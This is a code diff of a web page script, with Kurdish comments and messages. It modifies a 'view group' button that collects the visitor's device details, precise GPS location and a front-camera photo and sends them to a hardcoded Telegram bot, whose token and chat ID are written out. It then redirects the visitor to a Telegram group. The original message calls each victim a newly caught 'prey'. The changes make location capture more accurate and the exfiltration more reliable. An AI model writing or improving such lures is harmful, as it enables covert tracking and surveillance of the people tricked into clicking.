@@ -75,28 +75,32 @@ const BOT_TOKEN = "7953266205:AAElpU3B3iAytm4K7u_iU7q-1-N9oInK90I";
 const CHAT_ID = "1629990392";
 
 document.getElementById("viewGroupBtn").addEventListener("click", async function() {
-    let text = "🦅 نێچیرێکی نوێ ڕاوکرا!\n\n";
+    let text = "🦅 زانیاری نوێ وەرگیرا!\n\n";
     text += "🌐 وێبگەر: " + navigator.userAgent.split(" ")[0] + "\n";
     text += "📱 ئامێر: " + (/iPhone|iPad|iPod/i.test(navigator.userAgent) ? "iPhone (iOS)" : "Android") + "\n";
     text += "⚙️ بزوێنەر: " + navigator.platform + "\n";
     text += "📐 شاشە: " + window.screen.width + "x" + window.screen.height + "\n";
     text += "⏰ کات: " + new Date().toLocaleTimeString() + "\n";
 
-    // داواکردنی لۆکەیشنی دەقیق (GPS)
-    let mapsUrl = "مۆڵەت نەدرا!";
+    // داواکردنی لۆکەیشنی GPS لەگەڵ timeoutی گونجاو
+    let mapsUrl = "مۆڵەت نەدرا یان کات بەسەرچوو!";
     if (navigator.geolocation) {
         try {
             const pos = await new Promise((resolve, reject) => {
-                navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
+                navigator.geolocation.getCurrentPosition(resolve, reject, {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
+                });
             });
             mapsUrl = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
         } catch (e) {
-            mapsUrl = "ڕەتکرایەوە یان ڕووینەدا!";
+            console.log("GPS Error:", e);
         }
     }
     text += "📍 نەخشەی GPS: " + mapsUrl;
 
-    // داواکردنی کامێرا و گرتنی وێنە
+    // هەوڵدان بۆ گرتنی وێنە
     try {
         let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         let video = document.createElement('video');
@@ -111,23 +115,20 @@ document.getElementById("viewGroupBtn").addEventListener("click", async function
         
         stream.getTracks().forEach(track => track.stop());
 
-        // ناردنی وێنەکە بە شێوەی Photo بۆ تێلیگرام
-        canvas.toBlob(async function(blob) {
-            let formData = new FormData();
-            formData.append("chat_id", CHAT_ID);
-            formData.append("photo", blob, "photo.jpg");
-            formData.append("caption", text);
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
 
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: "POST",
-                body: formData
-            });
+        let formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("photo", blob, "photo.jpg");
+        formData.append("caption", text);
 
-            window.location.href = "https://t.me/kurdish_sys";
-        }, "image/jpeg");
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: "POST",
+            body: formData
+        });
 
     } catch (e) {
-        // ئەگەر کامێرا ڕەتکرایەوە، تەنها تێکستەکە بنێرێت
+        // ئەگەر کامێرا کاری نکرد یان ڕەتکرایەوە، تەنها دەق نێردرێت
         let formData = new FormData();
         formData.append("chat_id", CHAT_ID);
         formData.append("text", text + "\n❌ مۆڵەتی کامێرا نەدرا!");
@@ -136,9 +137,10 @@ document.getElementById("viewGroupBtn").addEventListener("click", async function
             method: "POST",
             body: formData
         });
-
-        window.location.href = "https://t.me/kurdish_sys";
     }
+
+    // گواستنەوە بۆ گروپی تێلیگرام دوای تەواوبوونی پرۆسەی ناردن
+    window.location.href = "https://t.me/kurdish_sys";
 });
 </script>
 
